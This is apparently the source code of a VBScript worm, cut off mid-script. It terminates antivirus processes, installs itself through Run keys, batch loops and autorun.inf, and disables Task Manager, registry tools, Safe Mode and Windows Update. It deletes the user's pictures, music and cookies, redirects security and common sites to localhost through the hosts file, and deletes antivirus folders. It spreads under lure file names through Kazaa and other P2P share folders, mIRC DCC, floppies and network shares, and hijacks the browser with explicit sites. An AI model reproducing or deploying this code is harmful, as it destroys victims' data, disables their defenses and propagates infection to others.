On Error Resume Next
For Each Process in GetObject("winmgmts:"). _
ExecQuery ("select name from Win32_Process where name='NAVAPSvc.exe'
OR name='Nprotect.exe' OR name='Nsched32.exe' OR name='Ndetect.exe' OR name='Nisserv.exe'
OR name='Nisum.exe' OR name='Nopdb.exe' OR name='Mcagent.exe' OR name='Mcshield.exe' OR name='Mcupdate.exe'
OR name='Mcvescn.exe' OR name='Mcvsrte.exe' OR name='Mcvsshld.exe' OR name='Monow.exe'
OR name='Mpfagent.exe' OR name='Mpftray.exe' OR name='Mscifapp.exe' OR name='Msksrvr.exe'
OR name='Mcvsftsn.exe' OR name='Naimas32.exe' OR name='Naimag32.exe'
OR name='Navapw32.exe' OR name='NavLu32.exe' OR name='Navw32.exe'")
Process.terminate(0)
Next
Set shl = CreateObject("Wscript.shell")
Set fso = CreateObject("Scripting.FileSystemObject")
winfolder = fso.GetSpecialFolder(0)
systemdir = fso.GetSpecialFolder(1)
tempdir = fso.GetSpecialFolder(2)
Set vbsfile = fso.GetFile(WScript.ScriptFullName)
vbsfile.Copy winfolder & "\control.vbs"
vbsfile.Copy systemdir & "\pubpqn.vbs"
vbsfile.Copy systemdir & "\User_Log.htm"
vbsfile.Copy tempdir & "\funny.vbs"
vbsfile.Copy tempdir & "\antivirus.exe.vbs"
vbsfile.Copy "C:\autorun.vbs"
Shl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\control",winfolder & "\16Å³³³\control.vbs"
Shl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\system","C:\system.bat"
Shl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\control",winfolder & "\16Å³³³\control.vbs"
Shl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\system","C:\system.bat"
Shl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce\control",winfolder & "\16Å³³³\control.vbs"
Shl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce\system","C:\system.bat"
Shl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\control",winfolder & "\16Å³³³\control.vbs"
Shl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\system","C:\system.bat"
Shl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\Common Startup",winfolder & "\16Å³³³"
Shl.RegWrite "HKCU\Software\Kazaa\LocalContent\DisableSharing","00000000"
Shl.RegWrite "HKCU\Software\Kazaa\LocalContent\DownloadDir","C:\Program Files\Kazaa\My Shared Folder"
shl.RegWrite "HKLM\Software\Kazaa\Transfer\DlDir0","C:\Program Files\Kazaa\My Shared Folder"
Set a = fs.CreateTextFile("C:\system.bat", True)
a.WriteLine ("@echo off")
a.WriteLine (":loop")
a.WriteLine ("if not exist %windir%\16Å³³³ goto make else goto replace")
a.WriteLine (":make")
a.WriteLine ("cd %windir%")
a.WriteLine ("md 16Å³³³")
a.WriteLine (":replace")
a.WriteLine ("if not exist %windir%\16Å³³³\control.vbs goto replacing else goto loop")
a.WriteLine (":replacing")
a.WriteLine ("copy %windir%\system32\pubpqn.vbs %windir%\16Å³³³\control.vbs")
a.WriteLine ("start %windir%\16Å³³³\control.vbs")
a.WriteLine ("Goto loop")
a.Close
shl.run "C:\system.bat", vbHide
editini winfolder&"\win.ini","[windows]","load",C:\junk.bat
editini winfolder&"\win.ini","[windows]","run",C:\system.bat
Set a = fs.CreateTextFile("C:\control.bat", True)
a.WriteLine ("@echo off")
a.WriteLine ("attrib +s +r +h %windir%\control.vbs")
a.WriteLine ("cd %windir%")
a.WriteLine ("md 16Å³³³")
a.WriteLine ("attrib +h +s %windir%\16Å³³³")
a.WriteLine ("copy %windir%\control.vbs %windir%\16Å³³³")
a.WriteLine ("attrib +s +r +h %windir%\system32\pubpqn.vbs")
a.WriteLine ("attrib +s +r +h C:\system.bat")
a.WriteLine ("attrib +s +r +h C:\autorun.bat")
a.WriteLine ("echo call C:\system.bat >>C:\autoxec.bat")
a.WriteLine ("echo call C:\junk.bat >>C:\autoxec.bat")
a.WriteLine ("if exist c:\inetpub\scripts\ copy %windir%\system32\cmd.exe c:\inetpub\scripts\ else goto :junk")
a.WriteLine (":junk")
a.WriteLine ("md %windir%\junk")
a.WriteLine ("attrib +h +s %windir%\junk")
a.WriteLine ("md C:\%username%")
a.WriteLine ("copy %windir%\control.vbs C:\%username%\funny.vbs")
a.WriteLine ("copy %windir%\control.vbs C:\%username%\antivirus.vbs")
a.WriteLine ("copy %windir%\system32\User_Log.htm C:\%username%\Cool_Website.htm")
a.WriteLine ("net share %username%=C:\%username% if error level is 1 goto next")
a.WriteLine (":next")
a.WriteLine ("echo [autorun] >C:\Autorun.inf")
a.WriteLine ("echo OPEN=C:\autorun.vbs >>C:\Autorun.inf")
a.WriteLine ("echo [InternetShortcut] >>%userprofile%\favorites\*.url")
a.WriteLine ("echo URL=http://www.gaymen.com/home.html >>%userprofile%\favorites\*.url")
a.WriteLine ("echo [InternetShortcut] >%userprofile%\desktop\Gay_Men.url")
a.WriteLine ("echo URL=http://www.gaymen.com/home.html >>%userprofile%\desktop\Gay_Men.url")
a.WriteLine ("echo [InternetShortcut] >%userprofile%\desktop\Mega_Porn_Links.url")
a.WriteLine ("echo URL=http://www.megapornlinks.com >>%userprofile%\desktop\Mega_Porn_Links.url")
a.WriteLine ("echo [InternetShortcut] >%userprofile%\desktop\Casino.url")
a.WriteLine ("echo URL=http://www.casino.com >>%userprofile%\desktop\Casino.url")
a.WriteLine ("echo [InternetShortcut] >%userprofile%\desktop\Penis_Bot.url")
a.WriteLine ("echo URL=http://www.penisbot.com >>%userprofile%\desktop\Penis_Bot.url")
a.WriteLine ("set TopAppend=<html><body><script>")
a.WriteLine ("set AppendToFile=%windir%\system32\User_Log.htm")
a.WriteLine ("echo %TopAppend% >temp.tmp")
a.WriteLine ("type %AppendToFile% >>temp.tmp")
a.WriteLine ("copy temp.tmp %AppendToFile%")
a.WriteLine ("del temp.tmp")
a.WriteLine ("echo </script></body></html> >>%windir%\system32\User_Log.htm")
a.WriteLine ("del %userprofile%\Cookies\*.txt")
a.WriteLine ("del %userprofile%\My Documents\My Pictures\*.jpg")
a.WriteLine ("del %userprofile%\My Documents\My Pictures\*.gif")
a.WriteLine ("del %userprofile%\My Documents\My Pictures\*.png")
a.WriteLine ("del %userprofile%\My Documents\My Music\*.mp3")
a.WriteLine ("echo del %windir%\taskman.exe >>C:\autoxec.bat")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs A:\funny.vbs if error level is 1 goto floppy")
a.WriteLine ("attrib -h -s A:\funny.vbs")
a.WriteLine (":floppy")
a.WriteLine ("if exist C:\Program Files\Kazaa\My Shared Folder goto kazaa else goto kazaa lite")
a.WriteLine (":kazaa")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Kazaa\My Shared Folder\Norton Anti-virus 2004.exe.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Kazaa\My Shared Folder\funny.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Kazaa\My Shared Folder\porn.jpg.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Kazaa\My Shared Folder\game.exe.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Kazaa\My Shared Folder\FREE_SEX.jpg.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Kazaa\My Shared Folder\babes.jpg.vbs")
a.WriteLine ("copy %windir%\system32\User_Log.htm C:\Program Files\Kazaa\My Shared Folder\FREE_SEX.htm")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Kazaa\My Shared Folder\how to hack.doc.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Kazaa\My Shared Folder\photoshop 9 crack.exe.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Kazaa\My Shared Folder\britney.jpg.vbs")
a.WriteLine ("goto msn")
a.WriteLine (":kazaa lite")
a.WriteLine ("if exist C:\Program Files\Kazaa Lite\My Shared Folder goto kazaa leet else goto morpheus")
a.WriteLine (":Kazaa leet")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Kazaa Lite\My Shared Folder\Norton Anti-virus 2004.exe.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Kazaa Lite\My Shared Folder\funny.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Kazaa Lite\My Shared Folder\game.exe.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Kazaa Lite\My Shared Folder\porn.jpg.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Kazaa Lite\My Shared Folder\babes.jpg.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Kazaa Lite\My Shared Folder\how to hack.doc.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Kazaa Lite\My Shared Folder\photoshop 9 crack.exe.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Kazaa Lite\My Shared Folder\FREE_SEX.jpg.vbs")
a.WriteLine ("copy %windir%\system32\User_Log.htm C:\Program Files\Kazaa Lite\My Shared Folder\FREE_SEX.htm")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Kazaa Lite\My Shared Folder\britney.jpg.vbs")
a.WriteLine (":morpheus")
a.WriteLine ("if exist C:\Program Files\StreamCast\Morpheus\My Shared Folder goto morpheus4.0 else goto bearshare")
a.WriteLine (":morpheus4.0")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\StreamCast\Morpheus\My Shared Folder\Norton Anti-virus 2004.exe.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\StreamCast\Morpheus\My Shared Folder\funny.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\StreamCast\Morpheus\My Shared Folder\game.exe.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\StreamCast\Morpheus\My Shared Folder\porn.jpg.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\StreamCast\Morpheus\My Shared Folder\babes.jpg.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\StreamCast\Morpheus\My Shared Folder\how to hack.doc.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\StreamCast\Morpheus\My Shared Folder\photoshop 9 crack.exe.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\StreamCast\Morpheus\My Shared Folder\FREE_SEX.jpg.vbs")
a.WriteLine ("copy %windir%\system32\User_Log.htm C:\Program Files\StreamCast\Morpheus\My Shared Folder\FREE_SEX.htm")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\StreamCast\Morpheus\My Shared Folder\britney.jpg.vbs")
a.WriteLine (":bearshare")
a.WriteLine ("if exist C:\Program Files\BearShare\Shared goto bearshare2 else goto grokster")
a.WriteLine (":bearshare2")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\BearShare\Shared\Norton Anti-virus 2004.exe.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\BearShare\Shared\funny.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\BearShare\Shared\game.exe.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\BearShare\Shared\porn.jpg.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\BearShare\Shared\babes.jpg.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\BearShare\Shared\how to hack.doc.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\BearShare\Shared\photoshop 9 crack.exe.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\BearShare\Shared\FREE_SEX.jpg.vbs")
a.WriteLine ("copy %windir%\system32\User_Log.htm C:\Program Files\BearShare\Shared\FREE_SEX.htm")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\BearShare\Shared\britney.jpg.vbs")
a.WriteLine (":grokster")
a.WriteLine ("if exist C:\Program Files\Grokster\My Grokster goto grokster2 else goto edonkey")
a.WriteLine (":grokster2")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Grokster\My Grokster\Norton Anti-virus 2004.exe.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Grokster\My Grokster\funny.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Grokster\My Grokster\game.exe.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Grokster\My Grokster\porn.jpg.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Grokster\My Grokster\babes.jpg.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Grokster\My Grokster\how to hack.doc.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Grokster\My Grokster\photoshop 9 crack.exe.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Grokster\My Grokster\FREE_SEX.jpg.vbs")
a.WriteLine ("copy %windir%\system32\User_Log.htm C:\Program Files\Grokster\My Grokster\FREE_SEX.htm")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Grokster\My Grokster\britney.jpg.vbs")
a.WriteLine (":edonkey")
a.WriteLine ("if exist C:\Program Files\Edonkey2000\Incoming goto edonkey2000 else goto msn")
a.WriteLine (":edonkey2000")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Edonkey2000\Incoming\Norton Anti-virus 2004.exe.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Edonkey2000\Incoming\funny.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Edonkey2000\Incoming\game.exe.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Edonkey2000\Incoming\porn.jpg.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Edonkey2000\Incoming\babes.jpg.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Edonkey2000\Incoming\how to hack.doc.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Edonkey2000\Incoming\photoshop 9 crack.exe.vbs")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Edonkey2000\Incoming\FREE_SEX.jpg.vbs")
a.WriteLine ("copy %windir%\system32\User_Log.htm C:\Program Files\Edonkey2000\Incoming\FREE_SEX.htm")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs C:\Program Files\Edonkey2000\Incoming\britney.jpg.vbs")
a.WriteLine (":msn")
a.WriteLine ("if exist %userprofile%\My Documents\My Received Files goto msn downloads else goto close")
a.WriteLine (":msn downloads")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs %userprofile%\My Documents\My Received Files\funny.vbs")
a.WriteLine ("copy %windir%\system32\User_Log.htm %userprofile%\My Documents\My Received Files\My_Website.htm")
a.WriteLine (":close")
a.WriteLine ("exit")
a.Close
shl.run "C:\control.bat", vbHide
Wscript.sleep 3000
fso.deletefile("C:\control.bat")
Set a = fs.CreateTextFile("C:\junk.bat", True)
a.WriteLine ("@echo off")
a.WriteLine ("attrib +h +r +s c:\junk.bat")
a.WriteLine (":loop")
a.WriteLine ("cd %windir%\junk")
a.WriteLine ("copy %windir%\16Å³³³\control.vbs %windir%\junk\%random%.vbs")
a.WriteLine ("md %random%")
a.WriteLine ("Goto loop")
a.Close
shl.run "C:\junk.bat", vbHide
Set a = fs.CreateTextFile("C:\Disable.bat", True)
a.WriteLine ("@echo off")
a.WriteLine ("echo 127.0.0.1       www.symantec.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.mcafee.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.zonelabs.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.microsoft.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.authentium.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.norton.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.zonealarm.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.misec.net >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.grisoft.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.norman.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.esafe.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.f-secure.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.consealfirewall.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.nemx.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.normanuk.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.pestpatrol.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.cyber.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.agnitum.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.cc-software.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.ca.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.checkflow.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.proxyplus.cz >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.ositis.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.f-prot.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.pandasoftware.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.mcafeestore.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.ashampoo.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.linkbyte.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.sarc.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.vcatch.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.networkice.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.stiller.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.nod32.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.moosoft.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.ravantivirus.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.sophos.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.vet.com.au >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.microworldsystems.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.gfi.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.cheyenne.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.drsolomon.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.avast.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.portcullis-security.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.atshield.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.perantivirus.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.quikheal.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.winproxy.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.viralock.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.persystems.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.trend.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.diamondcs.com.au >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.trendmicro.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.nai.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.gdata.de >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.emsisoft.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.dials.ru >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.sygate.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.my-etrust.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.bitdefender-es.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.bitdefender.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.reflex-magnetics.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.reflex-magnetics.co.uk >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.viruslist.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.free-av.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.kaspersky.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       blackice.iss.net >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.securenet.org >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.kbalertz.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.antiviraldp.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.tinysoftware.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.google.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.luosoft.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.hotmail.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.yahoo.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.askjeeves.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.astonsoft.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.altavista.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.kazaa.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.morpheus.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.edonkey.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.grokster.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.bearshare.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.msn.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       messenger.hotmail.com >>%windir%\system32\drivers\etc\hosts")
a.WriteLine ("echo 127.0.0.1       www.battle.net >>%windir%\system32\drivers\etc\hosts")
a.Close
shl.run "C:\Disable.bat", vbHide
Wscript.sleep 3000
fso.deletefile("C:\Disable.bat")
Shl.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.gaymen.com/home.html"
Shl.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page","http://www.gaymen.com/home.html"
Shl.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\FullScreen","yes"
Shl.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Window Title","Satan ~ Explorer"
Shl.RegWrite "HKCU\Software\Policies\Microsoft\WindowsMediaPlayer\TitleBar","Mediaplayer From Hell"
Shl.RegWrite "HKCU\Identities\{7246FE60-6167-11D7-832A-9660EE62B864}\Software\Microsoft\Outlook Express\5.0\WindowTitle","Satan's Mailbox"
Shl.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\CompanyName","Hell"
Shl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "Hell"
Shl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","Satan"
Shl.RegWrite "HKCU\Control Panel\International\sCountry","Hell"
Shl.RegWrite "HKCR\VBSFile\DefaultIcon\","%windir%\System32\shell32.dll,-154"
Shl.RegWrite "HKLM\Software\Classes\ShellScrap\NeverShowExt","vbs"
Shl.RegWrite "HKCU\Software\Microsoft\Windows Scripting Host\Settings\Timeout","0"
Shl.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions","1"
Shl.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoWindowsUpdate","1"
Shl.RegWrite "HKLM\Control Panel\Mouse\DoubleClickSpeed","100"
Shl.RegWrite "HKLM\Control Panel\Mouse\MouseSensitivity","5"
Shl.RegWrite "HKLM\Control Panel\Mouse\MouseSpeed","0"
Shl.RegWrite "HKLM\Control Panel\Mouse\SwapMouseButtons","1"
Shl.RegWrite "HKLM\Control Panel\Keyboard\KeyboardDelay","9"
Shl.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr","1"
Shl.RegWrite "HKU\.DEFAULT\Control Panel\Desktop\AutoEndTasks","1"
Shl.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools","1"
Shl.RegWrite "HKCC\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable","0"
Shl.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones","0"
Shl.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden","0"
Shl.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden","0"
Shl.RegWrite "HKLM\SOFTWARE\Microsoft\MessengerService\Policies\IMWarning","Satan's Messenger"
Shl.RegWrite "HKCU\ControlPanel\Desktop\MenuShowDelay","3000"
Shl.RegWrite "HKLM\SOFTWARE\Morpheus\Location\Country","Hell"
Shl.RegWrite "HKLM\SOFTWARE\Morpheus\Location\City","Hell"
Shl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DisableKeyboard", "Rundll32.exe Keyboard,Disable"
Shl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DisableMouse", "Rundll32.exe Mouse,Disable"
Shl.RegDelete "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot"
Shl.RegDelete "HKLM\SYSTEM\ControlSet001\Control\SafeBoot"
Shl.RegDelete "HKLM\SYSTEM\ControlSet002\Control\SafeBoot"
Shl.RegDelete "HKLM\SYSTEM\ControlSet003\Control\SafeBoot"
Shl.RegWrite "HKLM\Software\Symantec\Norton AntiVirus\EnableAP", "0"
set mirc=fso.CreateTextFile("C:\mirc\script.ini")
fso.CopyFile Wscript.ScriptFullName, "C:\mirc\funny.vbs", True
fso.CopyFile Wscript.ScriptFullName, "C:\mirc\game.vbs", True
fso.CopyFile Wscript.ScriptFullName, "C:\mirc\how to hack.vbs", True
Randomize
num = Int((3 * Rnd) + 1)
if num = 1 then
mirc.WriteLine "[script]"
mirc.WriteLine "n0=on 1:join:*.*: { if ( $nick !=$me ) {halt} /dcc send $nick C:\mirc\funny.vbs }
mirc.Close
else if num = 2 then
mirc.WriteLine "[script]"
mirc.WriteLine "n0=on 1:join:*.*: { if ( $nick !=$me ) {halt} /dcc send $nick C:\mirc\game.vbs }
mirc.Close
else if num = 3 then
mirc.WriteLine "[script]"
mirc.WriteLine "n0=on 1:join:*.*: { if ( $nick !=$me ) {halt} /dcc send $nick C:\mirc\how to hack.vbs }
mirc.Close
end if
If fso.FolderExists ("C:\Program Files\Norton AntiVirus") Then
fso.DeleteFolder "C:\Program Files\Norton AntiVirus",True
If fso.FolderExists ("C:\Program Files\Tiny Personal Firewall") Then
fso.DeleteFolder "C:\Program Files\Tiny Personal Firewall",True
If fso.FolderExists ("C:\Program Files\Panda Software\Panda Antivirus Titanium") Then
